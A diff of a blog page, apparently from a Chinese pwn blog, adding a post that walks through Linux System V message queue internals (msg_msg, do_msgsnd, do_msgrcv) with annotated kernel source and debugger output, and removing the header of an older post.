+<li><code>msgsnd</code> 和 <code>msgrcv</code> 都依靠另一个重要的结构体 - <code>msg_msg</code>：</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">	<span class="keyword">long</span> m_type;</span><br><span class="line">	<span class="keyword">size_t</span> m_ts;		<span class="comment">/* message text size */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line">	<span class="keyword">void</span> *security;		<span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>往消息队列中添加消息 <code>msgsnd</code>：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7ffff7ee2eb8</span> &lt;msgsnd+<span class="number">24</span>&gt;    syscall  &lt;SYS_msgsnd&gt;</span><br><span class="line">       msqid: <span class="number">0x16</span></span><br><span class="line">       msgp: <span class="number">0x7fffffffddd0</span> ◂— <span class="number">0x378</span></span><br><span class="line">       msgsz: <span class="number">0x18</span></span><br><span class="line">       msgflg: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>用户态的底层还是一个 syscall</li>
+<li>内核态中就是以下这个函数：</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">ksys_msgsnd</span><span class="params">(<span class="keyword">int</span> msqid, struct msgbuf __user *msgp, <span class="keyword">size_t</span> msgsz,</span></span></span><br><span class="line"><span class="params"><span class="function">		 <span class="keyword">int</span> msgflg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">long</span> mtype;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (get_user(mtype, &amp;msgp-&gt;mtype)) <span class="comment">/* 从用户空间获取单个数据-msg类型 */</span></span><br><span class="line">		<span class="keyword">return</span> -EFAULT;</span><br><span class="line">	<span class="keyword">return</span> do_msgsnd(msqid, mtype, msgp-&gt;mtext, msgsz, msgflg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">do_msgsnd</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">long</span> mtype, <span class="keyword">void</span> __user *mtext,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">size_t</span> msgsz, <span class="keyword">int</span> msgflg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> *<span class="title">msq</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">	DEFINE_WAKE_Q(wake_q);</span><br><span class="line"></span><br><span class="line">	ns = current-&gt;nsproxy-&gt;ipc_ns;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (msgsz &gt; ns-&gt;msg_ctlmax || (<span class="keyword">long</span>) msgsz &lt; <span class="number">0</span> || msqid &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	<span class="keyword">if</span> (mtype &lt; <span class="number">1</span>)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	msg = load_msg(mtext, msgsz); <span class="comment">/* 先调用&quot;alloc_msg(msgsz)&quot;创建一个msg_msg结构体,然后调用&quot;copy_from_user(msg+1,mtext,msgsz)&quot;拷贝用户空间的mtext紧跟msg_msg结构体的后面 */</span></span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(msg))</span><br><span class="line">		<span class="keyword">return</span> PTR_ERR(msg);</span><br><span class="line"></span><br><span class="line">	msg-&gt;m_type = mtype; <span class="comment">/* 写入msg类型 */</span></span><br><span class="line">	msg-&gt;m_ts = msgsz; <span class="comment">/* 写入msg大小 */</span></span><br><span class="line"></span><br><span class="line">	rcu_read_lock();</span><br><span class="line">	msq = msq_obtain_object_check(ns, msqid); <span class="comment">/* 通过msqid从namespace中找到对应的msq-&gt;q_perm结构体,然后调用container_of通过偏移计算得到msg_queue结构体地址 */</span></span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(msq)) &#123;</span><br><span class="line">		err = PTR_ERR(msq);</span><br><span class="line">		<span class="keyword">goto</span> out_unlock1;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ipc_lock_object(&amp;msq-&gt;q_perm);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">msg_sender</span> <span class="title">s</span>;</span> <span class="comment">/* 定义了发送消息链表 */</span></span><br><span class="line"></span><br><span class="line">		err = -EACCES;</span><br><span class="line">		<span class="keyword">if</span> (ipcperms(ns, &amp;msq-&gt;q_perm, S_IWUGO))</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* raced with RMID? */</span></span><br><span class="line">		<span class="keyword">if</span> (!ipc_valid_object(&amp;msq-&gt;q_perm)) &#123; <span class="comment">/* 检查该队列是否被删除 */</span></span><br><span class="line">			err = -EIDRM;</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		err = security_msg_queue_msgsnd(&amp;msq-&gt;q_perm, msg, msgflg); <span class="comment">/* 调用一个钩子函数 */</span></span><br><span class="line">		<span class="keyword">if</span> (err)</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		<span class="keyword">if</span> (msg_fits_inqueue(msq, msgsz)) <span class="comment">/* 检查消息队列是否满 */</span></span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* queue full, wait: */</span></span><br><span class="line">		<span class="keyword">if</span> (msgflg &amp; IPC_NOWAIT) &#123; <span class="comment">/* IPC_NOWAIT:当消息队列已满的时候,msgsnd函数不等待立即返回 */</span></span><br><span class="line">			err = -EAGAIN;</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* enqueue the sender and prepare to block */</span></span><br><span class="line">		ss_add(msq, &amp;s, msgsz);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!ipc_rcu_getref(&amp;msq-&gt;q_perm)) &#123;</span><br><span class="line">			err = -EIDRM;</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">		rcu_read_unlock();</span><br><span class="line">		schedule();</span><br><span class="line">		rcu_read_lock();</span><br><span class="line">		ipc_lock_object(&amp;msq-&gt;q_perm);</span><br><span class="line"></span><br><span class="line">		ipc_rcu_putref(&amp;msq-&gt;q_perm, msg_rcu_free);</span><br><span class="line">		<span class="comment">/* raced with RMID? */</span></span><br><span class="line">		<span class="keyword">if</span> (!ipc_valid_object(&amp;msq-&gt;q_perm)) &#123; <span class="comment">/* 检查该队列是否被删除 */</span></span><br><span class="line">			err = -EIDRM;</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line">		ss_del(&amp;s);</span><br><span class="line">		<span class="keyword">if</span> (signal_pending(current)) &#123; <span class="comment">/* 仅仅检查一下是否有信号,不处理信号 */</span></span><br><span class="line">			err = -ERESTARTNOHAND;</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ipc_update_pid(&amp;msq-&gt;q_lspid, task_tgid(current));</span><br><span class="line">	msq-&gt;q_stime = ktime_get_real_seconds();</span><br><span class="line">	</span><br><span class="line">    <span class="comment">/* 如果有被阻塞的接收进程,且消息满足接收要求,则将消息直接发送给被阻塞的接收进程</span></span><br><span class="line"><span class="comment">    否则,将消息排入消息队列尾 */</span> </span><br><span class="line">	<span class="keyword">if</span> (!pipelined_send(msq, msg, &amp;wake_q)) &#123;</span><br><span class="line">		list_add_tail(&amp;msg-&gt;m_list, &amp;msq-&gt;q_messages); <span class="comment">/* 插入msg_msg链表的尾部 */</span></span><br><span class="line">		msq-&gt;q_cbytes += msgsz;</span><br><span class="line">		msq-&gt;q_qnum++;</span><br><span class="line">		atomic_add(msgsz, &amp;ns-&gt;msg_bytes);</span><br><span class="line">		atomic_inc(&amp;ns-&gt;msg_hdrs);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err = <span class="number">0</span>;</span><br><span class="line">	msg = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">out_unlock0:</span><br><span class="line">	ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">	wake_up_q(&amp;wake_q);</span><br><span class="line">out_unlock1:</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line">	<span class="keyword">if</span> (msg != <span class="literal">NULL</span>)</span><br><span class="line">		free_msg(msg);</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>这里总结一下 <code>do_msgsnd</code> 的功能：<ul>
+<li>调用 <code>load_msg</code> 创建一个 msg_msg 结构体，把数据拷贝到该 msg_msg 的后面</li>
+<li>通过 msqid 计算得到 msg_queue 结构体地址</li>
+<li>检查 msg_queue 后，对将要被发送的数据进行处理：<ul>
+<li>如果有被阻塞的接收进程，则将消息直接发送给被阻塞的接收进程</li>
+<li>否则，将消息排入消息队列尾</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>从消息队列中读取消息 <code>msgrcv</code>：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7ffff7ee2f68</span> &lt;msgrcv+<span class="number">24</span>&gt;    syscall  &lt;SYS_msgrcv&gt;</span><br><span class="line">       msqid: <span class="number">0x16</span></span><br><span class="line">       msgp: <span class="number">0x7fffffffde60</span> ◂— <span class="number">0x0</span></span><br><span class="line">       msgsz: <span class="number">0x80</span></span><br><span class="line">       msgtyp: <span class="number">0x3e7</span></span><br><span class="line">       msgflg: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>用户态的底层还是一个 syscall</li>
+<li>内核态中就是以下这个函数：</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">ksys_msgrcv</span><span class="params">(<span class="keyword">int</span> msqid, struct msgbuf __user *msgp, <span class="keyword">size_t</span> msgsz,</span></span></span><br><span class="line"><span class="params"><span class="function">		 <span class="keyword">long</span> msgtyp, <span class="keyword">int</span> msgflg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> do_msgrcv(msqid, msgp, msgsz, msgtyp, msgflg, do_msg_fill);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">do_msgrcv</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> __user *buf, <span class="keyword">size_t</span> bufsz, <span class="keyword">long</span> msgtyp, <span class="keyword">int</span> msgflg,</span></span></span><br><span class="line"><span class="params"><span class="function">	       <span class="keyword">long</span> (*msg_handler)(<span class="keyword">void</span> __user *, struct msg_msg *, <span class="keyword">size_t</span>))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> mode;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> *<span class="title">msq</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>, *<span class="title">copy</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	DEFINE_WAKE_Q(wake_q);</span><br><span class="line"></span><br><span class="line">	ns = current-&gt;nsproxy-&gt;ipc_ns;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (msqid &lt; <span class="number">0</span> || (<span class="keyword">long</span>) bufsz &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line">		<span class="keyword">if</span> ((msgflg &amp; MSG_EXCEPT) || !(msgflg &amp; IPC_NOWAIT))</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		copy = prepare_copy(buf, <span class="keyword">min_t</span>(<span class="keyword">size_t</span>, bufsz, ns-&gt;msg_ctlmax)); <span class="comment">/* 调用&quot;load_msg(buf, bufsz)&quot;,生成msg_msg为copy做准备 */</span></span><br><span class="line">		<span class="keyword">if</span> (IS_ERR(copy))</span><br><span class="line">			<span class="keyword">return</span> PTR_ERR(copy);</span><br><span class="line">	&#125;</span><br><span class="line">	mode = convert_mode(&amp;msgtyp, msgflg);</span><br><span class="line"></span><br><span class="line">	rcu_read_lock();</span><br><span class="line">	msq = msq_obtain_object_check(ns, msqid); <span class="comment">/* 通过msqid从namespace中找到对应的msq-&gt;q_perm结构体,然后调用container_of通过偏移计算得到msg_queue结构体地址 */</span></span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(msq)) &#123;</span><br><span class="line">		rcu_read_unlock();</span><br><span class="line">		free_copy(copy);</span><br><span class="line">		<span class="keyword">return</span> PTR_ERR(msq);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">msg_receiver</span> <span class="title">msr_d</span>;</span> <span class="comment">/* 定义了接收消息链表 */</span></span><br><span class="line"></span><br><span class="line">		msg = ERR_PTR(-EACCES);</span><br><span class="line">		<span class="keyword">if</span> (ipcperms(ns, &amp;msq-&gt;q_perm, S_IRUGO))</span><br><span class="line">			<span class="keyword">goto</span> out_unlock1;</span><br><span class="line"></span><br><span class="line">		ipc_lock_object(&amp;msq-&gt;q_perm);</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* raced with RMID? */</span></span><br><span class="line">		<span class="keyword">if</span> (!ipc_valid_object(&amp;msq-&gt;q_perm)) &#123;</span><br><span class="line">			msg = ERR_PTR(-EIDRM);</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		msg = find_msg(msq, &amp;msgtyp, mode); <span class="comment">/* 查找可用的msg */</span></span><br><span class="line">		<span class="keyword">if</span> (!IS_ERR(msg)) &#123;</span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * Found a suitable message.</span></span><br><span class="line"><span class="comment">			 * Unlink it from the queue.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			<span class="keyword">if</span> ((bufsz &lt; msg-&gt;m_ts) &amp;&amp; !(msgflg &amp; MSG_NOERROR)) &#123;</span><br><span class="line">				msg = ERR_PTR(-E2BIG);</span><br><span class="line">				<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * If we are copying, then do not unlink message and do</span></span><br><span class="line"><span class="comment">			 * not update queue parameters.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			<span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line">				msg = copy_msg(msg, copy); <span class="comment">/* MSG_COPY:将message拷贝一份后再拷贝到用户空间 */</span></span><br><span class="line">				<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			list_del(&amp;msg-&gt;m_list); <span class="comment">/* 把已经接收过数据的msg脱链 */</span></span><br><span class="line">			msq-&gt;q_qnum--;</span><br><span class="line">			msq-&gt;q_rtime = ktime_get_real_seconds();</span><br><span class="line">			ipc_update_pid(&amp;msq-&gt;q_lrpid, task_tgid(current));</span><br><span class="line">			msq-&gt;q_cbytes -= msg-&gt;m_ts;</span><br><span class="line">			atomic_sub(msg-&gt;m_ts, &amp;ns-&gt;msg_bytes);</span><br><span class="line">			atomic_dec(&amp;ns-&gt;msg_hdrs);</span><br><span class="line">			ss_wakeup(msq, &amp;wake_q, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* No message waiting. Wait for a message */</span></span><br><span class="line">		<span class="keyword">if</span> (msgflg &amp; IPC_NOWAIT) &#123; <span class="comment">/* IPC_NOWAIT:如果没有符合条件的msg则立即返回 */</span> </span><br><span class="line">			msg = ERR_PTR(-ENOMSG);</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		list_add_tail(&amp;msr_d.r_list, &amp;msq-&gt;q_receivers); <span class="comment">/* 插入msg_msg链表尾 */</span></span><br><span class="line">		msr_d.r_tsk = current;</span><br><span class="line">		msr_d.r_msgtype = msgtyp;</span><br><span class="line">		msr_d.r_mode = mode;</span><br><span class="line">		<span class="keyword">if</span> (msgflg &amp; MSG_NOERROR)</span><br><span class="line">			msr_d.r_maxsize = INT_MAX;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			msr_d.r_maxsize = bufsz;</span><br><span class="line">		msr_d.r_msg = ERR_PTR(-EAGAIN);</span><br><span class="line">		__set_current_state(TASK_INTERRUPTIBLE);</span><br><span class="line"></span><br><span class="line">		ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">		rcu_read_unlock();</span><br><span class="line">		schedule();</span><br><span class="line">		rcu_read_lock();</span><br><span class="line"></span><br><span class="line">		msg = READ_ONCE(msr_d.r_msg); <span class="comment">/* 读出msg变量 */</span></span><br><span class="line">		<span class="keyword">if</span> (msg != ERR_PTR(-EAGAIN))</span><br><span class="line">			<span class="keyword">goto</span> out_unlock1;</span><br><span class="line"></span><br><span class="line">		ipc_lock_object(&amp;msq-&gt;q_perm);</span><br><span class="line"></span><br><span class="line">		msg = msr_d.r_msg;</span><br><span class="line">		<span class="keyword">if</span> (msg != ERR_PTR(-EAGAIN))</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line"></span><br><span class="line">		list_del(&amp;msr_d.r_list); </span><br><span class="line">		<span class="keyword">if</span> (signal_pending(current)) &#123; <span class="comment">/* 仅仅检查一下是否有信号,不处理信号 */</span></span><br><span class="line">			msg = ERR_PTR(-ERESTARTNOHAND);</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">out_unlock0:</span><br><span class="line">	ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">	wake_up_q(&amp;wake_q);</span><br><span class="line">out_unlock1:</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(msg)) &#123;</span><br><span class="line">		free_copy(copy);</span><br><span class="line">		<span class="keyword">return</span> PTR_ERR(msg);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	bufsz = msg_handler(buf, msg, bufsz); <span class="comment">/* 这里的msg_handler就是do_msg_fill */</span></span><br><span class="line">	free_msg(msg);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> bufsz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>这里总结一下 <code>do_msgrcv</code> 的功能：<ul>
+<li>调用 <code>prepare_copy</code> 为后面的复制做准备（在底层还是调用 <code>load_msg</code> 创建一个 msg_msg 结构体，再把数据拷贝到该 msg_msg 的后面）</li>
+<li>通过 msqid 计算得到 msg_queue 结构体地址</li>
+<li>调用 <code>find_msg</code> 查找可用的 msg_msg 结构体（这些 msg_msg 都是 <code>msgsnd</code> 发送出来的）</li>
+<li>调用 <code>do_msg_fill-&gt;store_msg-&gt;copy_to_user</code> 把 msg_msg 中的内容传输到用户态</li>
+</ul>
+</li>
+</ul>
+<p><strong>msg VS Pipe</strong></p>
+<p>同样是进程间的通信，那么消息队列与管道相较而言有哪些优势和劣势：</p>
+<ul>
+<li>优点：<ul>
+<li>消息队列收发消息自动保证了同步，不需要由进程自己来提供同步方法，而命名管道需要自行处理同步问题</li>
+<li>消息队列接收数据可以根据消息类型有选择的接收特定类型的数据，不需要像命名管道一样默认接收数据</li>
+</ul>
+</li>
+<li>缺点： <ul>
+<li>发送和接受的每个数据都有最大的长度限制</li>
+</ul>
+</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/17/x86-32&64%E5%A4%84%E7%90%86%E5%99%A8%E7%9A%84%E5%87%A0%E7%A7%8D%E8%BF%90%E8%A1%8C%E6%A8%A1%E5%BC%8F/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1841,157 +2133,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/30/ARM%20pwn+ret2csu/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="yhellow">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Pwn进你的心">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/08/30/ARM%20pwn+ret2csu/" class="post-title-link" itemprop="url">ARM pwn+ret2csu</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2022-08-30 15:39:56 / Modified: 15:41:30" itemprop="dateCreated datePublished" datetime="2022-08-30T15:39:56+08:00">2022-08-30</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
